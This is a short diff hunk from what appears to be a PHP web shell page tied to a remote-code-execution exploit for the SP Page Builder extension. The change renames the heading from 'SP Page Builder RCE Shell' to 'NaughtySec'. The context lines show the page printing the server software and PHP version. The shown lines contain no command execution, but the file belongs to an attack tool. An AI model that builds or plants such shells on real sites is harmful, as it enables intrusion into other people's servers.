@@ -48,7 +48,7 @@ if (isset($_GET['info'])) {{
 </head>
 <body>
     <div class="container">
-        <h1>SP Page Builder RCE Shell</h1>
+        <h1>NaughtySec</h1>
         <p>Server: <?php echo $_SERVER['SERVER_SOFTWARE']; ?></p>
         <p>PHP: <?php echo phpversion(); ?></p>
         <hr>
